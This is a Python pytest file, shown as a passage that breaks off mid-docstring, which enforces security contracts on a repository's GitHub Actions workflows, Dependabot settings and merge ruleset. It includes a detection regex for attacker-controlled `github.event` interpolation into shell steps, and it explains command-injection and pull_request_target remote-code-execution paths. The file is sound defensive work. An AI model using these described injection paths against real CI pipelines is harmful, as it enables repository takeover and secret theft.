"""Repository contract tests for repo hygiene gating files.

Config-only changes are normally untestable, yet deleting or weakening one of
the files asserted here removes a real safety property with no visible symptom:

- ``.github/CODEOWNERS`` losing its wildcard line silently stops every path
  from requiring review.
- ``.gitattributes`` going missing leaves line-ending normalisation undefined
  across platforms, so the same file content diffs differently per machine.
- ``.gitignore`` losing the council rule lets a regenerated council artifact
  back into a commit, which permanently reddens the gitleaks pre-push gate
  because that hook scans the full git history rather than the working tree.
- ``pyproject.toml`` keeping the ``hatchling`` scaffolding description
  publishes ``Add your description here`` to every index that reads the
  built metadata, and no build or lint step complains about it.
- ``pyproject.toml`` advertising a ``requires-python`` floor below the
  interpreter the repo is actually pinned to claims support for a release that
  neither the linter, the type checker, nor the CI matrix ever exercises.
- a workflow under ``.github/workflows/`` dropping its ``permissions`` or
  ``concurrency`` block: an absent ``permissions`` block silently inherits
  whatever the repository default happens to be, and an absent ``concurrency``
  block lets superseded runs pile up instead of cancelling each other.
- a third-party ``uses:`` falling back to a mutable tag or branch: whoever
  controls the tag controls the code CI runs, and the 40-hex pin plus its
  trailing version comment is what keeps that boundary immutable while keeping
  the jump reviewable.
- ``ci-status-checker`` losing a job id from its ``needs``: ``CI Status`` is the
  single required status check, so a job omitted from ``needs`` quietly stops
  gating merges, with no symptom in the Actions UI, the ruleset, or a red build.
- a ``run:`` body interpolating ``${{ github.event.pull_request.* }}``: a
  ``run:`` body is evaluated as a shell script, so an attacker-controlled
  branch name or PR title becomes command injection rather than data.
- the ``detect-changes`` path filters dropping a path they claim to guard: the
  ``CI Status`` gate is fail-closed, so an under-specified filter skips exactly
  the jobs that should have run.
- a scheduled security workflow losing its own ``concurrency`` group:
  ``cancel-in-progress`` is evaluated on the *arriving* run, so a scheduled scan
  sharing a group with ordinary pushes is killed by the next push, and a security
  scan that silently never completes is worse than one that fails, because
  nothing reports it.
- a SARIF upload becoming reachable from a pull-request run: Scorecard's
  ``pull_request`` runs are ``supply-chain/local`` and omit the
  ``branch-protection`` and ``online-scm`` categories, so uploading them
  overwrites the default-branch baseline and emits a "configurations not found"
  warning on every PR, which trains reviewers to ignore code-scanning warnings.
- ``zizmor.yml``'s deny-all ``permissions: {}`` being widened to
  ``permissions: write-all``, which hands every job in the file full write
  access, including a job added later that nobody reviewed.
- a checkout appearing in a ``pull_request_target`` / ``workflow_run`` workflow:
  those triggers run with a write token against attacker-influenceable code, so
  a checkout plus a build or test step is a remote-code-execution path.
- CodeQL's matrix losing the ``actions`` language, or its ``init`` step falling
  back to the default query suite: the workflow files are the highest-value
  attack surface in this repository, and ``security-and-quality`` is the
  default suite and does *not* satisfy this.
- ``dependabot-auto-merge.yml`` gaining a ``uses:`` beyond
  ``dependabot/fetch-metadata``, or a checkout: it runs on
  ``pull_request_target`` holding ``contents: write``, so a checkout plus any
  later build or test step is remote code execution *with a push token*.
- that workflow's Gate 1 dropping the account-type or repository clause: the
  login alone is satisfiable by a human account named ``dependabot[bot]``, and
  the repository clause is what stops the workflow being repurposed in a fork.
- its merge policy losing the pre-chain ``eligible=false`` default, gaining a
  second ``eligible=true`` branch, or losing the terminal ``else``: the policy
  has to be an allow-list, because Dependabot introduces new update-types over
  time and an unrecognised one is the normal case, not the exception.
- any ``gh pr merge`` gaining ``--admin``: that flag bypasses the branch
  protection the whole workflow exists to respect, which includes the single
  required ``CI Status`` check.
- ``.github/dependabot.yml`` drifting from that policy -- a group that mixes
  ``patch`` with ``minor`` reports the whole group as ``semver-minor``, so the
  auto-merge gate rejects an all-patch roll-up; a lost ``versioning-strategy:
  increase`` lets ``uv.lock`` drift ahead of the ``>=X.Y.Z`` lower bounds the
  manifest declares.
- ``cd.yml``'s ``release`` job losing ``ci`` or ``build`` from its ``needs``, or
  the reusable call losing ``run-all: true``: a tag that moved only a markdown
  file makes ``detect-changes`` skip the Python jobs, so a release gate that
  accepted that ships untested code. CI is *called* rather than copied, because
  the copy that gates releases is the one nobody updates.
- ``cd.yml`` setting ``cancel-in-progress: true``, or leaving ``enable-cache``
  to setup-uv's ``auto`` default: ``cancel-in-progress`` is evaluated on the
  *arriving* run and both triggers resolve to the same ref, so the second run
  cancels the first mid-publish and leaves a half-populated release; a poisoned
  cache entry must never be able to influence a release artifact.
- a second job in ``cd.yml`` gaining ``contents: write``, or the ``release``
  job gaining a checkout: a write token can rewrite tags and releases, so it
  belongs on the one job that publishes, and a checkout is how untrusted code
  gets onto a runner holding one.
- ``cd.yml``'s build matrix dropping a platform, losing the smoke test, or
  leaving the artifact upload at its lenient default: the artifact is a frozen
  binary, so a platform that only ever ran on its own builder proves nothing
  about the other two, and ``if-no-files-found: warn`` yields a release missing
  a platform rather than a failed build.
- ``cd.yml`` dropping its ``actions/attest`` step, its ``id-token: write`` or
  ``attestations: write``, or ``generate_release_notes: true``: an unattested
  downloadable binary cannot be traced to the commit it was built from, and the
  OIDC scope is what lets Sigstore sign it at all.
- the ``allow()`` helper inside ``ci-status-checker`` dropping its
  ``[ "$1" = false ]`` provenance term, or any of its three lines: that clause
  is the fail-closed mechanism the whole gate design rests on, GitHub counts a
  *skipped* required check as success, and a cancelled run leaves never-started
  jobs reported as "skipped" (github.com/actions/runner#3041).
- a scheduled workflow falling back to the bare boolean
  ``cancel-in-progress: true``: ``cancel-in-progress`` is evaluated on the
  *arriving* run, so the bare boolean lets the next push kill a security scan
  that was supposed to complete, and a scan that silently never completes is
  worse than one that fails because nothing reports it.
- the ruleset in ``scripts/apply_ruleset.sh`` requiring a status-check context
  the repository never emits -- ``CodeQL`` in particular, whose real contexts are
  the matrix-expanded ``Analyze (python)`` / ``Analyze (actions)`` job names. A
  context GitHub never reports can never be satisfied, so it wedges every merge
  until somebody edits the ruleset under pressure.
- a ``workflow_run`` filter naming a workflow that no longer exists: the filter
  matches on a workflow's ``name:``, not its filename, so a rename on either
  side silently stops the dependent job from ever running again, with no error
  anywhere in the Actions UI.
- a privileged job gaining scope beyond what it needs: the existing checks are
  subset checks, so an unnecessary ``contents: write`` on a
  ``pull_request_target`` / ``workflow_run`` job reads exactly like a correct
  one. ``default-assignee.yml`` runs on both of those triggers, so the excess
  scope would be a push-capable token with no visible symptom.
- the release pipeline's reusable CI call dropping ``secrets.CODECOV_TOKEN`` on
  either side of the call: a reusable workflow does not inherit the caller's
  secrets implicitly, so a missing entry leaves the secret empty inside
  ``ci.yml``, and actionlint rejects a caller passing a secret the callee never
  declares.

Every assertion below is derived from file contents or from a real ``git``
subprocess run, so each one can be observed to fail under a targeted mutation.
"""

from __future__ import annotations

import json
import os
import re
import shlex
import shutil

# This module must ask git directly, so `subprocess` is unavoidable. Every call
# below uses a fixed argv, `shell=False`, and no interpolated user input.
import subprocess  # ruff: ignore[suspicious-subprocess-import]
import tomllib
from pathlib import Path

import pytest
import yaml

ALWAYS_CONDITION = "always()"
# The three lines of the `ci-status-checker` gate's `allow()` helper, quoted
# exactly. Every character is load-bearing: the second line's `&&` chain has to
# join *both* the skipped-result test and the filter-provenance test, because
# `[ "$2" = skipped ] && return 0` is the same gate with its safety property
# removed, and it is a shorter edit to make by accident than by intent.
ALLOW_DENY_LINE = "return 1"
ALLOW_FUNCTION_NAME = "allow"
ALLOW_SKIPPED_LINE = '[ "$2" = skipped ] && [ "$1" = false ] && return 0'
ALLOW_SUCCESS_LINE = '[ "$2" = success ] && return 0'
REQUIRED_ALLOW_LINES = frozenset({
    ALLOW_SUCCESS_LINE,
    ALLOW_SKIPPED_LINE,
    ALLOW_DENY_LINE,
})
# `actions/attest` is the current entry point for build provenance; the older
# `attest-build-provenance` action is now a thin wrapper over it, so naming the
# wrapper instead would gate on a deprecated path rather than on provenance.
ATTEST_ACTION = "actions/attest"
# A `./`-prefixed reference is a checked-out local action, and a `docker://`
# one is a container image. `docker://` is deliberately *excluded* from the
# auto-merge allow-list even though the pinning rule above treats both as
# local: a container image runs its own entrypoint, so it is code execution,
# and nothing in that workflow needs one.
AUTO_MERGE_ALLOWED_LOCAL_PREFIX = "./"
AUTO_MERGE_JOB_ID = "auto-merge"
AUTO_MERGE_WORKFLOW_FILE = "dependabot-auto-merge.yml"
# The only scopes the auto-merge job may hold, asserted as an exact set rather
# than as a subset. The existing contract checks that `contents: write` and
# `pull-requests: write` are *present*, which is precisely the check that cannot
# see a third scope somebody added for convenience.
ALLOWED_ASSIGN_NEW_WORK_PERMISSIONS: dict[str, str] = {
    "issues": "write",
    "pull-requests": "write",
}
ASSIGN_ALERTS_JOB_ID = "assign-code-scanning-alerts"
ASSIGN_NEW_WORK_JOB_ID = "assign-new-work"
BUILD_JOB = "build"
# `cancel-in-progress` is evaluated on the *arriving* run, so the release
# pipeline pins the bare boolean rather than a conditional expression: nothing
# that arrives later may cancel a publish already in flight.
CANCEL_IN_PROGRESS_KEY = "cancel-in-progress"
CD_WORKFLOW_FILE = "cd.yml"
CI_JOB = "ci"
# The job implementing the single required status check. Addressed by job id
# rather than by `name:` here so a rename of the gate shows up as a failure to
# find it, which is the same signal a ruleset pointing at the old name gives.
CI_STATUS_JOB_ID = "ci-status-checker"
CI_WORKFLOW_FILE = "ci.yml"
# The reusable-workflow call the release gate depends on. A `./` path is the
# only spelling that keeps one definition of CI: a copy of its jobs inside the
# release file drifts, and the copy that gates releases is the one nobody
# remembers to update.
CI_REUSABLE_WORKFLOW = "./.github/workflows/ci.yml"
# The group is keyed on the ref alone, precisely so the tag-push and
# release-published runs of one tag serialise behind each other rather than
# running concurrently into the same release.
CONCURRENCY_REF_REFERENCE = "github.ref"
CONTENTS_READ = "read"
CONTENTS_SCOPE = "contents"
# `dist/` is the pyinstaller output directory, and every build-side path
# assertion keys on it together with the per-OS artifact name: that pairing is
# what ties an attested name to a file that was actually produced.
DIST_PREFIX = "dist/"
CHECKOUT_ACTION = "actions/checkout"
CODEOWNERS_WILDCARD = "* @iamwatchdogs"
CODEQL_ANALYZE_ACTION = "github/codeql-action/analyze"
CODEQL_ANALYZE_JOB_NAME_RE = re.compile(r"Analyze \([^()]+\)")
CODEQL_INIT_ACTION = "github/codeql-action/init"
CODEQL_UPLOAD_SARIF_ACTION = "github/codeql-action/upload-sarif"
COMMIT_SHA_RE = re.compile(r"[0-9a-f]{40}")
CODEQL_WORKFLOW_FILE = "codeql.yml"
# A context that looks like it would name the CodeQL gate and cannot: the real
# check contexts are the matrix-expanded job names, which are asserted here to
# be `Analyze (...)`. Naming this one required would wedge every merge.
CODEQL_UNSATISFIABLE_CONTEXT = "CodeQL"
# The only secret threaded from the release pipeline into the reusable CI call.
# Asserted on both sides of the call, because a reusable workflow does not
# inherit the caller's secrets implicitly and actionlint rejects a caller
# passing a secret the callee never declares. This is the secret's *name*, which
# every workflow spelling it literally; the constant is named for what it is
# rather than for the string so a secret-shaped identifier does not read as a
# hardcoded credential.
CODECOV_CREDENTIAL_NAME = "CODECOV_TOKEN"
CONTEXT_KEY = "context"
COUNCIL_ARTIFACT = Path(".agents/council/extraction-candidates.jsonl")
# Exactly the two events zizmor's `dangerous-triggers` audit flags, and exactly
# the two that run with a write token against code an attacker can influence.
# `workflow_dispatch` is deliberately absent: zizmor v1.30.1 does not flag it,
# and it is only runnable by a principal who already holds write access, so it
# is not a path from untrusted code. Requiring the ignore comment there would
# demand a comment silencing an audit that never fires.
DANGEROUS_TRIGGERS = frozenset({"pull_request_target", "workflow_run"})
DEFAULT_ASSIGNEE_WORKFLOW_FILE = "default-assignee.yml"
DEPENDABOT_CONFIG = Path(".github/dependabot.yml")
ELIGIBLE_FALSE_ASSIGNMENT = "eligible=false"
# Anchored per line so the `echo "eligible=$eligible"` that writes the value to
# ``$GITHUB_OUTPUT`` is not mistaken for an assignment, and so a commented-out
# `eligible=true` inside a branch body is not counted either.
ELIGIBLE_TRUE_RE = re.compile(r"^\s*eligible=true\s*$", re.MULTILINE)
ELIGIBLE_UPDATE_TYPE = "version-update:semver-patch"
# setup-uv's own default for this input is `auto`, which already resolves to
# "no cache" on a tag push and on a release event. Stating it explicitly is
# what stops a future bump of that default from silently re-enabling a cache a
# release build restores from.
ENABLE_CACHE_KEY = "enable-cache"
ENV_KEY = "env"
EVENT_NAME_REFERENCE = "github.event_name"
# The exact grant the code-scanning-alert assignment job may hold. It talks to
# one API and to nothing else, so a fourth scope is never justified; the
# equality is what makes "excess" a test failure rather than a review note.
EXACT_ALERT_JOB_PERMISSIONS: dict[str, str] = {"security-events": "write"}
# The exact grant the auto-merge job may hold. `contents: write` moves the ref
# when the queued merge lands, `pull-requests: write` approves and enables the
# queue, and `issues: write` is required because labels are served by the issues
# API. Nothing else in that workflow touches the repository, and a token is
# only as narrow as the widest thing it was handed for.
EXACT_AUTO_MERGE_JOB_PERMISSIONS: dict[str, str] = {
    "contents": "write",
    "pull-requests": "write",
    "issues": "write",
}
EXPECTED_DEPENDABOT_ECOSYSTEMS = frozenset({"github-actions", "pre-commit", "uv"})
EXPECTED_PATH_FILTERS = frozenset({"json", "python", "workflows"})
# Exactly the three ecosystems the merge policy refuses to auto-merge, whatever
# their update-type. Each is named explicitly so that deleting one of the
# `elif` branches is a failure rather than a silent widening of the policy.
EXCLUDED_ECOSYSTEMS = frozenset({"docker", "github-actions", "pre-commit"})
FETCH_METADATA_ACTION = "dependabot/fetch-metadata"
# `generate_release_notes: true` asks GitHub to derive the notes from the
# merged pull requests. The falsey spellings are the failure, because an
# empty release body reads identically to a release nobody wrote notes for.
GENERATE_RELEASE_NOTES_KEY = "generate_release_notes"
GH_RELEASE_ACTION = "softprops/action-gh-release"
GH_MERGE_ADMIN_FLAG = "--admin"
GH_MERGE_AUTO_FLAG = "--auto"
GH_PR_MERGE = "gh pr merge"
GIT_ATTRIBUTES_RULE = "* text=auto eol=lf"
# The fail-closed spelling for the artifact upload. The action's own default is
# `warn`, so a missing binary uploads nothing, the build stays green, and the
# release ships with one platform silently absent.
IF_NO_FILES_FOUND_ERROR = "error"
IF_NO_FILES_FOUND_KEY = "if-no-files-found"
LOCAL_ACTION_PREFIXES = ("./", ".\\", "docker://")
MAJOR_UPDATE_TYPE = "major"
# A matrix value only ever reaches a shell through this expression, so it is
# asserted as a substring of a `run:` body rather than as a parsed value.
MATRIX_ASSET_REFERENCE = "matrix.asset"
MERGE_POLICY_STEP_NAME = "Evaluate merge policy"
MIN_DESCRIPTION_LENGTH = 20
MINOR_UPDATE_TYPE = "minor"
NEGATION = "!"
# A `name:` on a workflow or a job. For a workflow this is the value a
# `workflow_run:` filter matches against; for a job it is the status-check
# context GitHub reports.
NAME_KEY = "name"
PATCH_UPDATE_TYPE = "patch"
PERMISSION_WRITE = "write"
PATHS_FILTER_ACTION = "dorny/paths-filter"
PULL_REQUEST_TRIGGER = "pull_request"
# The freezer. Finding it in a `run:` body is what proves a binary is actually
# built rather than merely uploaded from a stale `dist/`.
PYINSTALLER_COMMAND = "pyinstaller"
MAKEFILE = Path("Makefile")
PYPROJECT_MANIFEST = Path("pyproject.toml")
PYTHON_VERSION_PIN = Path(".python-version")
QUOTED_TRIGGER_KEY = "on"
RELEASE_JOB = "release"
RUN_ALL_INPUT = "run-all"
REQUIRED_CODEQL_LANGUAGES = frozenset({"actions", "python"})
# `security-and-quality` is CodeQL's default suite and does not satisfy this;
# `security-extended` is the only value that widens it.
REQUIRED_CODEQL_QUERY_SUITE = "security-extended"
REQUIRED_COOLDOWN_DAYS = 7
# The three platforms the release ships a frozen binary for. Spelled out
# rather than derived from the matrix, because platform coverage is the
# decision being encoded: the artifact is platform-specific, so a build that
# only ever ran on its own builder proves nothing about the other two.
REQUIRED_BUILD_OPERATING_SYSTEMS = frozenset({
    "macos-latest",
    "ubuntu-latest",
    "windows-latest",
})
REQUIRED_PYTHON_FILTER_PATHS = ("pyproject.toml", "uv.lock")
REQUIRED_REQUIRES_PYTHON = ">=3.14"
REQUIRED_SCHEDULE_INTERVAL = "weekly"
REQUIRED_STATUS_CHECK_NAME = "CI Status"
# Spelled out in full rather than derived from the remote, so a fork of this
# repository that lifts the workflow fails the assertion instead of quietly
# re-pointing Gate 1 at itself.
REPOSITORY_SLUG = "iamwatchdogs/bigdata-mcp"
REQUIRED_WORKFLOWS_FILTER_PATH = ".github/workflows/*.yml"
RUN_KEY = "run"
RUN_SUFFIX = f".{RUN_KEY}"
# The ruleset that gates merges is not a YAML file in this repository; it is a
# JSON payload in a heredoc inside a shell script, because it has to be
# reviewable in place and must reach GitHub with `~DEFAULT_BRANCH` unexpanded.
# Reading it out of the heredoc is therefore the only way to keep the required
# status check and the check this repository actually emits in agreement.
RULESET_HEREDOC_DELIMITER = "JSON"
RULESET_SCRIPT = Path("scripts/apply_ruleset.sh")
RULE_STATUS_CHECK_TYPE = "required_status_checks"
SCAFFOLD_PLACEHOLDER_DESCRIPTION = "Add your description here"
# A reusable workflow does not inherit the caller's secrets implicitly, so both
# ends of the call name the secret explicitly. Asserted on both ends below.
SECRETS_KEY = "secrets"
# Matched against a raw `run:` body to locate a shell function's opening line.
# Parsing is not an option: the function is not YAML structure, and the closing
# brace is found by scanning for the first line whose stripped form is `}`.
SHELL_FUNCTION_RE = re.compile(r"^\s*(?P<name>[A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\)\s*\{")
# One literal, two uses: the `schedule:` trigger key, and the substring the
# `concurrency` group must carry so a scheduled run lands in its own group.
SCHEDULE_LITERAL = "schedule"
# The exact command the smoke test must execute: the frozen binary itself,
# addressed by the same per-OS name the attestation subject and the upload path
# use. Written as one literal rather than assembled from `DIST_PREFIX` and
# `MATRIX_ASSET_REFERENCE`, because the contiguous substring *is* the assertion
# and joining the two halves would also match `dist/x-${{ matrix.asset }}`.
SMOKE_TEST_COMMAND = "dist/${{ matrix.asset }}"
# The two weekly security scans. Named explicitly so that dropping either
# `schedule:` trigger is a failure rather than a silent narrowing of coverage.
SCHEDULED_SECURITY_WORKFLOW_FILES = frozenset({"codeql.yml", "scorecard.yml"})
TRIGGER_KEY = True  # PyYAML (YAML 1.1) resolves the bare key `on` to `True`.
UNTRUSTED_INPUT_RE = re.compile(
    r"\$\{\{\s*github\.event\.(?:pull_request|issue)\b[^{}]*\}\}"
)
# Expression contexts that are NOT attacker-controlled, and are therefore safe
# to interpolate into a `run:` body.
#
# This exists because the blanket "no expression may appear in a run: body" rule
# is stricter than its own threat model, and was internally inconsistent: its
# anti-vacuity guard required that some workflow interpolate an expression
# ("every run that needs a matrix value or a step output interpolates one"),
# while the very next assertion forbade all of them.
#
# The security property that actually matters is narrower and is enforced by
# UNTRUSTED_INPUT_RE above: a value an attacker can put in a branch name, a
# pull-request title, or an issue body must reach a shell through `env`, never
# inlined into the script text. The contexts below are repository-author
# literals or workflow-engine values:
#   - `matrix.*` comes from a literal `include:` list in the same file, so it is
#     as trusted as the surrounding YAML
#   - `steps.*.outputs.*` is output produced by this workflow's own steps
#   - `needs.*.outputs.*` is likewise, from an upstream job in this workflow
#   - `env.*` is an environment variable already materialised in this step
#   - `secrets.*` is a repository secret, resolved by the engine rather than
#     supplied by a user
#   - `github.repository`, `github.ref_name`, `github.run_id`, `github.sha` and
#     friends are structural facts about the run, not user-supplied text
#
# `github.event.*` is deliberately absent, with the exception of
# `github.event.number`, which is a GitHub-assigned integer rather than
# attacker text. Anything unrecognised is still rejected, so this list cannot
# silently widen: adding a new context to it is a deliberate act.
SAFE_EXPRESSION_RE = re.compile(
    r"\$\{\{\s*("
    r"matrix\.|"
    r"steps\.|"
    r"needs\.|"
    r"env\.|"
    r"secrets\.|"
    r"github\.(?:repository|ref_name|run_id|sha|actor|workflow|server_url|api_url)"
    r")[^{}]*\}\}"
)
# The one `github.event.*` field safe to interpolate: a sequence number
# assigned by GitHub, never a string the author or an attacker supplies.
SAFE_EVENT_FIELD = "github.event.number"
UV_ECOSYSTEM = "uv"
# `widen` is the Dependabot default: it only touches the lockfile when the new
# version still satisfies the existing bound, which lets `uv.lock` drift ahead
# of the `>=X.Y.Z` lower bounds pyproject.toml declares. `increase` raises the
# bound alongside the lockfile so the two can never disagree.
UV_VERSIONING_STRATEGY = "increase"
# The two trigger names that decide whether a workflow is privileged and whether
# a job's token is a push token. `workflow_call` is the reusable-workflow entry
# point whose `secrets:` block has to match what the caller passes.
WORKFLOW_CALL_TRIGGER = "workflow_call"
WORKFLOW_RUN_TRIGGER = "workflow_run"
SETUP_UV_ACTION = "astral-sh/setup-uv"
SUBJECT_PATH_KEY = "subject-path"
UPLOAD_ARTIFACT_ACTION = "actions/upload-artifact"
VERSION_COMMENT_RE = re.compile(r"v\d[\w.+-]*")
WITH_KEY = "with"
WORKFLOW_EXPRESSION_RE = re.compile(r"\$\{\{[^{}]*\}\}")
WORKFLOWS_DIR = Path(".github/workflows")
WRITE_ALL_PERMISSIONS = "write-all"
ZIZMOR_DANGEROUS_TRIGGERS_COMMENT = "zizmor: ignore[dangerous-triggers]"
ZIZMOR_JOB_ID = "zizmor"
ZIZMOR_WORKFLOW_FILE = "zizmor.yml"

# The three conjuncts of the auto-merge workflow's Gate 1, quoted exactly as
# GitHub's expression grammar spells them. Spelled as literals rather than
# assembled from a `dependabot[bot]` constant because the whole point is to pin
# the *string* an attacker would have to match, brackets included.
REQUIRED_GATE_ONE_CLAUSES = frozenset({
    "github.event.pull_request.user.login == 'dependabot[bot]'",
    "github.event.pull_request.user.type == 'Bot'",
    f"github.repository == '{REPOSITORY_SLUG}'",
})

# One parsed branch of a shell `if`/`elif`/`else` chain: its keyword, its
# condition line, the body indented under it, and the index of the keyword line
# within the script. The line index is what lets the pre-chain default be
# compared against the position of the chain rather than a character offset.
ShellBranch = tuple[str, str, str, int]

# Matched against the raw line so the trailing comment requirement is actually
# observable. Parsing alone would discard the comment entirely, and a bare
# `@v4` is a perfectly legal reference that must still fail.
USES_LINE_RE = re.compile(
    r"^\s*(?:-\s+)?uses:\s*(?P<reference>\S+)(?:\s+#\s*(?P<comment>\S+))?\s*$"
)

# The same reasoning as `USES_LINE_RE`, for the same reason: the trailing
# `# zizmor: ignore[dangerous-triggers]` has to be asserted against raw text,
# because parsing discards it and the requirement would become untestable. `#`
# is not a legal capture for `name`, so neither a commented-out trigger line nor
# a comment that merely names a trigger can match.
TRIGGER_KEY_LINE_RE = re.compile(
    r"^\s*(?P<name>[A-Za-z_][A-Za-z0-9_-]*)\s*:(?P<rest>.*)$"
)

# The deny-all workflow-level block must survive as an *empty* mapping. `{}` is
# the only spelling of "deny everything, grant per job"; a `permissions:` key
# with a body silently re-grants whatever it names.
REQUIRED_DENY_ALL_PERMISSIONS: dict[str, str] = {}

# What the `zizmor` job must re-grant to replace that deny-all default:
# `security-events: write` to upload findings, `contents: read` to check out the
# workflow files it is analysing. Asserted as a subset so a job may legitimately
# grant more (this one also reads workflow metadata via `actions: read`).
REQUIRED_ZIZMOR_JOB_PERMISSIONS: dict[str, str] = {
    "security-events": "write",
    "contents": "read",
}

# What the `auto-merge` job must re-grant, asserted as a subset for the same
# reason: `contents: write` to move the ref when the queued merge completes and
# `pull-requests: write` to approve and to enable the auto-merge queue. The file
# also grants `issues: write`, which is legitimately required because labels are
# served by the issues API, not the pull-requests one.
REQUIRED_AUTO_MERGE_JOB_PERMISSIONS: dict[str, str] = {
    "contents": "write",
    "pull-requests": "write",
}

# What the `build` job must re-grant for provenance to exist at all.
# `id-token: write` is the OIDC scope Sigstore's exchange needs, and
# `attestations: write` is what publishes the signed bundle. Asserted as a
# subset because the job also legitimately reads the repository. Both are
# silent failures: without the first the attest step has no token to exchange
# and without the second the signed bundle has nowhere to go, and neither
# reports an error -- the release simply ships an unattested binary.
REQUIRED_BUILD_JOB_PERMISSIONS: dict[str, str] = {
    "id-token": "write",
    "attestations": "write",
}


@pytest.fixture(scope="session")
def repo_root() -> Path:
    """Locate the repository root by walking up from this test file.

    Returns:
        The first ancestor directory of this file that holds a
        ``pyproject.toml``, which is this repository's root.

    Raises:
        RuntimeError: If no ancestor directory holds a ``pyproject.toml``.
    """
    for candidate in Path(__file__).resolve().parents:
        if (candidate / "pyproject.toml").is_file():
            return candidate
    msg = f"no pyproject.toml found in any parent of {__file__}"
    raise RuntimeError(msg)


def _workflow_paths(repo_root: Path) -> list[Path]:
    """List every workflow definition under ``.github/workflows``.

    The directory is walked rather than hardcoded to ``ci.yml`` because further
    workflows are added over time, and a test that only ever inspects one file
    would keep passing while a new workflow violated every rule below.

    Args:
        repo_root: The repository root.

    Returns:
        Every ``*.yml`` and ``*.yaml`` file below ``.github/workflows``, sorted
        so failure messages are stable between runs.
    """
    workflows_dir = repo_root / WORKFLOWS_DIR
    found = sorted({*workflows_dir.rglob("*.yml"), *workflows_dir.rglob("*.yaml")})
    assert found, (
        f"{workflows_dir} holds no workflow files, so every workflow contract "
        "below would pass without inspecting anything"
    )
    return found


def _as_mapping(node: object, label: str) -> dict[object, object]:
    """Re-type a parsed YAML mapping so the gradual type stays contained.

    PyYAML ships no type information, so every node it returns is gradual.
    Re-typing at this single boundary keeps that from propagating into the
    assertions and into the type checker, while still failing loudly if the
    node is not a mapping at all.

    Args:
        node: The node to interpret as a mapping.
        label: What the node is meant to be, used in the failure message.

    Returns:
        The same mapping, typed as ``dict[object, object]``.
    """
    assert isinstance(node, dict), (
        f"{label} is not a mapping (got {type(node).__name__})"
    )
    # The explicit key/value rebuild is deliberate rather than incidental.
    # `dict(node)`, `mapping.update(node)` and `dict(node.items())` are
    # equivalent at runtime, but each widens PyYAML's gradual key and value
    # types, and only this form lands in `dict[object, object]`. The
    # suppression is on the rewrite ruff would otherwise suggest, which the
    # type checker then rejects -- a rewrite that trades a lint for a type
    # error is not an improvement.
    return {  # ruff: ignore[unnecessary-comprehension]
        key: value for key, value in node.items()
    }


def _load_workflow(path: Path) -> dict[object, object]:
    """Parse a workflow file into its top-level mapping.

    Args:
        path: The workflow file to parse.

    Returns:
        The parsed top-level mapping, with keys exactly as PyYAML produced them.
    """
    return _as_mapping(yaml.safe_load(path.read_text(encoding="utf-8")), str(path))


def _trigger_value(data: dict[object, object]) -> object:
    """Return a workflow's parsed ``on:`` value under either YAML 1.1 spelling.

    PyYAML implements YAML 1.1, in which the bare key ``on`` is the boolean
    ``True`` rather than the string ``"on"``. A quoted ``"on"`` stays a string.
    Both spellings declare the same trigger, so neither is mistaken for a
    missing one; the key is never renamed on disk to work around this.

    Args:
        data: A parsed workflow mapping.

    Returns:
        The trigger value, or ``None`` when no trigger is declared.
    """
    if TRIGGER_KEY in data:
        return data[TRIGGER_KEY]
    return data.get(QUOTED_TRIGGER_KEY)


def _workflow_jobs(
    data: dict[object, object], path: Path
) -> dict[str, dict[object, object]]:
    """Return a workflow's jobs, keyed by job id.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in failure messages.

    Returns:
        The ``jobs:`` mapping with stringified job ids.
    """
    jobs = _as_mapping(data.get("jobs"), f"`jobs:` in {path}")
    typed: dict[str, dict[object, object]] = {}
    for key, value in jobs.items():
        job = _as_mapping(value, f"job {key!r} in {path}")
        typed[str(key)] = job
    return typed


def _job_steps(job: dict[object, object]) -> list[dict[object, object]]:
    """Return the step mappings declared by one job.

    Args:
        job: A parsed job mapping.

    Returns:
        Every mapping in the job's ``steps:`` list, or an empty list when the
        job declares no steps.
    """
    steps = job.get("steps")
    if not isinstance(steps, list):
        return []
    return [_as_mapping(step, "a step") for step in steps if isinstance(step, dict)]


def _needed_job_ids(needs: object) -> set[str]:
    """Normalise a job's ``needs:`` value into a set of job ids.

    GitHub accepts a bare id, a comma-separated string, a list, or a mapping of
    id to result condition, so all four are collapsed to the same set here.

    Args:
        needs: The raw ``needs:`` value.

    Returns:
        The referenced job ids, empty when the value is not a usable form.
    """
    if isinstance(needs, str):
        return {part.strip() for part in needs.split(",") if part.strip()}
    if isinstance(needs, dict):
        return {str(key) for key in needs}
    if isinstance(needs, list):
        return {str(item) for item in needs}
    return set()


def _normalise_expression(text: str) -> str:
    """Strip the ``${{ }}`` wrapper and collapse whitespace from an expression.

    Args:
        text: A raw ``if:`` value from a parsed workflow.

    Returns:
        The expression body, so ``${{ always() }}`` and ``always()`` compare
        equal.
    """
    stripped = text.strip()
    if stripped.startswith("${{") and stripped.endswith("}}"):
        stripped = stripped[3:-2]
    return " ".join(stripped.split())


def _is_third_party_action(reference: str) -> bool:
    """Report whether a ``uses:`` value names a separately published action.

    ``./path`` and ``.\\path`` are checked-out local actions and ``docker://``
    values are container images. Neither is an action repository, and neither
    takes a commit SHA, so neither is subject to the pinning rule.

    Args:
        reference: The right-hand side of a ``uses:`` line.

    Returns:
        True when the reference names a third-party ``owner/repo@ref`` action.
    """
    if reference.startswith(LOCAL_ACTION_PREFIXES):
        return False
    return "/" in reference


def _pin_problems(reference: str, comment: str | None) -> list[str]:
    """Describe why a third-party ``uses:`` reference is not correctly pinned.

    Args:
        reference: The right-hand side of the ``uses:`` line.
        comment: The trailing ``# ...`` comment on that line, if it has one.

    Returns:
        One message per violated rule, empty when the pin is already correct.
    """
    owner_repo, separator, revision = reference.rpartition("@")
    if not separator or not owner_repo:
        return ["no `@` revision at all, so the reference is unpinned"]
    problems: list[str] = []
    if not COMMIT_SHA_RE.fullmatch(revision):
        problems.append(
            f"revision {revision!r} is not a 40-character lowercase-hex commit "
            "SHA, so it is a mutable tag or branch"
        )
    if comment is None:
        problems.append("the line carries no `# vX.Y.Z` version comment")
    elif not VERSION_COMMENT_RE.fullmatch(comment):
        problems.append(
            f"trailing comment {comment!r} is not a `# vX.Y.Z` version comment"
        )
    return problems


def _interpolation_sites(
    node: object, location: str, *, in_env: bool
) -> list[tuple[str, str, bool]]:
    """Find every ``${{ ... }}`` expression in a parsed workflow.

    The walk is structural rather than textual so ``in_env`` is derived from
    the actual YAML path: an expression is only considered safely quoted when it
    sits in a value of a mapping whose key is ``env``, at job level or step
